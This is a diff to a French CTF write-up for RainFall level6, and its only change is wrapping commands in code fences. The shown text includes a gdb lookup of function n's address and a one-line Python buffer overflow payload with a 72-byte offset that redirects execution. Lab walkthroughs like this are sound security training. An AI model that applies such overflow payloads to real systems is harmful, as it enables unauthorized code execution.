@@ -18,11 +18,11 @@ Il suffit donc de faire comme pour le level2 un overflow exploit
 
 --------------------------------------
 Adresse de n :
-
+```
 level6@RainFall:~$ gdb ./level6 
 (gdb) p &n
 $1 = (<text variable, no debug info> *) 0x8048454 <n>
-
+```
 ---------------------------------------
 
 Offset de l'adresse de retour :
@@ -76,5 +76,6 @@ Creation de l'exploit :
 
 offset : 72
 adresse de n : 0x8048454
-
+```
 ./level6 "$(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')"
+```
